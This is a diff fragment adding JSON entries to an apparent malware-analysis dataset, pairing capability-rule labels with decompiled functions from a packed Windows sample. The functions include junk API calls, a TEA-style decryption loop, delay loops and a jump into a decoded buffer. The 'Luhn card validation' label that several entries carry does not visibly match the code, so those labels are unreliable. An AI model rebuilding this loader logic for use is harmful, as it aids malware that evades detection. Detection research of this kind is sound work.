+        "decompiled_code": "\nvoid __cdecl fcn.0041b960(int32_t arg_8h)\n\n{\n    uint lpBuffer;\n    uint var_248h;\n    uint nSize;\n    uint lpVersionInformation;\n    uint var_4h;\n    \n    if (*0x27c852c == 0x37) {\n        (*_sym.imp.KERNEL32.dll_GetComputerNameW)(&lpBuffer, &nSize);\n        (*_sym.imp.KERNEL32.dll_LoadLibraryA)(\"lunepolalohobanofe\");\n        (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(\"xusicukapexi\");\n        (*_sym.imp.KERNEL32.dll_FileTimeToDosDateTime)(0, 0, 0);\n        (*_sym.imp.KERNEL32.dll_GetVersionExW)(&lpVersionInformation);\n        (*_sym.imp.KERNEL32.dll_VerifyVersionInfoW)(&var_248h, 0, 0, 0);\n        (*_sym.imp.KERNEL32.dll_OpenWaitableTimerA)(0, 0, \"widap girecimohab\");\n        (*_sym.imp.KERNEL32.dll_GetCurrentThreadId)();\n        (*_sym.imp.KERNEL32.dll_CreateDirectoryA)(\"newayigogoxecisujitepayecicolu\", 0);\n        (*_sym.imp.KERNEL32.dll_LoadLibraryA)(0);\n        (*_sym.imp.KERNEL32.dll_CreateSemaphoreW)(0, 0, 0, L\"yicasoxab\");\n        (*_sym.imp.KERNEL32.dll_FreeEnvironmentStringsA)(0);\n        (*_sym.imp.KERNEL32.dll_CompareStringA)(0, 0, \"suripelefahaniyidasopel\", 0, \"sogejuxeyepiwidesawuwixac\", 0);\n    }\n    *(*0x27c0670 + arg_8h) = *(*0x27c8c28 + 0x12336 + arg_8h);\n    return;\n}\n",
+        "token_count": 430
+    },
+    "0041bd00": {
+        "rules": [
+            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
+        ],
+        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_38h\n// WARNING: Variable defined which should be unmapped: var_34h\n\nvoid __cdecl fcn.0041bd00(uint32_t *arg_8h, int32_t *arg_ch)\n\n{\n    uint var_38h;\n    uint var_34h;\n    uint32_t var_30h;\n    int32_t var_2ch;\n    uint var_28h;\n    int32_t var_24h;\n    int32_t var_20h;\n    uint32_t var_1ch;\n    int32_t var_18h;\n    uint32_t var_14h;\n    uint32_t var_10h;\n    uint32_t var_ch;\n    int32_t var_8h;\n    uint32_t var_4h;\n    \n    var_30h = *arg_8h;\n    var_ch = arg_8h[1];\n    var_18h = -0x3910c8e0;\n    var_28h = 0x9e3779b9;\n    var_8h = *arg_ch;\n    if (*0x27c852c == 0x13f7) {\n        (*_sym.imp.KERNEL32.dll_EnumResourceNamesA)(0, \"pedizificujozinapihenikacujowarolojuvawusoziz\", 0, 0);\n    }\n    var_2ch = arg_ch[1];\n    var_24h = arg_ch[2];\n    var_20h = arg_ch[3];\n    for (var_4h = 0; var_4h < 0x20; var_4h = var_4h + 1) {\n        var_1ch = var_30h << 4;\n        if (*0x27c852c == 0xe) {\n            (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(0, 0);\n        }\n        var_1ch = var_1ch + var_24h;\n        *0x27c0674 = var_30h + var_18h;\n        var_14h = (var_30h >> 5) + var_20h;\n        var_10h = *0x27c0674;\n        if (*0x27c852c == 0xfe) {\n            (*_sym.imp.KERNEL32.dll_OpenMutexA)(0, 0, \"mihecokovimevamemizosere\");\n        }\n        fcn.0041ba60(&var_1ch, var_10h);\n        *0x27c0674 = var_14h;\n        fcn.0041ba80(&var_14h, var_1ch, var_14h);\n        var_ch = var_ch - var_14h;\n        var_1ch = var_ch * 0x10 + var_8h;\n        var_10h = var_ch + var_18h;\n        if (*0x27c852c == 0x196) {\n            (*_sym.imp.KERNEL32.dll_SetFilePointer)(0, 0, 0, 0);\n        }\n        *0x27c0678 = 0xcbd61084;\n        *0x27c067c = 0xffffffff;\n        var_14h = (var_ch >> 5) + var_2ch;\n        var_1ch = var_1ch ^ var_10h ^ var_14h;\n        fcn.0041baa0(&var_30h, var_1ch);\n        fcn.0041bac0(&var_18h, var_28h);\n    }\n    *arg_8h = var_30h;\n    arg_8h[1] = var_ch;\n    if (*0x27c852c == 0x107) {\n        (*_sym.imp.KERNEL32.dll_FindAtomW)(L\"zepifurahayowenacicosar\");\n    }\n    return;\n}\n",
+        "token_count": 873
+    },
+    "0041c040": {
+        "rules": [
+            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
+        ],
+        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid fcn.0041c040(void)\n\n{\n    int32_t var_984h;\n    uint var_980h;\n    int32_t var_97ch;\n    uint var_978h;\n    uint lpBuffer;\n    uint uStackY48;\n    uint uStackY44;\n    uint uStackY40;\n    uint uStackY36;\n    uint *puStackY32;\n    char16_t *pcStackY28;\n    uint uStackY24;\n    char *pcStackY20;\n    uint32_t var_4h;\n    \n    fcn.0040e300();\n    for (var_4h = 0; var_4h < 0x32d05d76; var_4h = var_4h + 1) {\n        var_4h = 0x41c072;\n        (*_sym.imp.KERNEL32.dll_GetTickCount)();\n        if (*0x27c852c == 0xfc) {\n            var_4h = 0;\n            (*_sym.imp.KERNEL32.dll_SetConsoleCursorInfo)();\n            pcStackY20 = \"nejuvujoweyisesevalolagagu\";\n            uStackY24 = 0x41c098;\n            (*_sym.imp.KERNEL32.dll_WriteProfileSectionA)();\n        }\n        if (*0x27c852c == 0x5e4) {\n            var_4h = 0;\n            pcStackY20 = NULL;\n            uStackY24 = 0x41c0b2;\n            (*_sym.imp.KERNEL32.dll_VirtualAlloc)();\n            uStackY24 = 0x800;\n            pcStackY28 = &fcn.0041c040::lpBuffer;\n            puStackY32 = 0x41c0c4;\n            (*_sym.imp.KERNEL32.dll_GetSystemWindowsDirectoryW)();\n            puStackY32 = &fcn.0041c040::var_978h;\n            uStackY36 = 0;\n            uStackY40 = 0;\n            uStackY44 = 0x41c0d5;\n            (*_sym.imp.KERNEL32.dll_GetCPInfoExA)();\n            uStackY44 = 0x41c0db;\n            (*_sym.imp.KERNEL32.dll_GetCommandLineA)();\n            uStackY44 = 0;\n            uStackY48 = 0x41c0e3;\n            (*_sym.imp.KERNEL32.dll_GetStartupInfoA)();\n        }\n        if (0x9be51dc < var_4h) break;\n    }\n    pcStackY20 = 0x41c10a;\n    fcn.0041bf00(*0x27c0670, *0x27c852c, 0x426fd0);\n    for (var_97ch = 0; var_97ch < 0x3e79e; var_97ch = var_97ch + 1) {\n        if (*0x27c852c == 0x10) {\n            pcStackY20 = &fcn.0041c040::var_980h;\n            uStackY24 = 0x41c147;\n            (*_sym.imp.KERNEL32.dll_InterlockedDecrement)();\n            uStackY24 = 0;\n            pcStackY28 = L\"tavebohuru\";\n            puStackY32 = 0x41c154;\n            (*_sym.imp.KERNEL32.dll_WaitNamedPipeW)();\n            puStackY32 = NULL;\n            uStackY36 = 0x41c15c;\n            (*_sym.imp.KERNEL32.dll_SetCurrentDirectoryW)();\n        }\n        if (var_97ch == 0x1e673) {\n            pcStackY20 = 0x41c16d;\n            fcn.0041b940();\n        }\n    }\n    for (var_984h = 0; var_984h < 0xdd9a7; var_984h = var_984h + 1) {\n        if (*0x27c852c == 0xc01) {\n            pcStackY20 = NULL;\n            uStackY24 = 0;\n            pcStackY28 = 0x41c1ac;\n            (*_sym.imp.KERNEL32.dll_HeapWalk)();\n        }\n    }\n    // WARNING: Could not recover jumptable at 0x0041c1ae. Too many branches\n    // WARNING: Treating indirect jump as call\n    (**0x27c0670)();\n    return;\n}\n",
+        "token_count": 996
+    },
+    "0040e3e0": {
+        "rules": [
+            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
+            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
+            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
+            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
+            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
+        ],
+        "decompiled_code": "\nuint __cdecl fcn.0040e3e0(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint in_EAX;\n    uint uVar1;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = fcn.00413af0(arg_8h, arg_ch, arg_10h, arg_14h, in_EAX, 0, 0, 0);\n    return uVar1;\n}\n",
+        "token_count": 113
+    }
+}
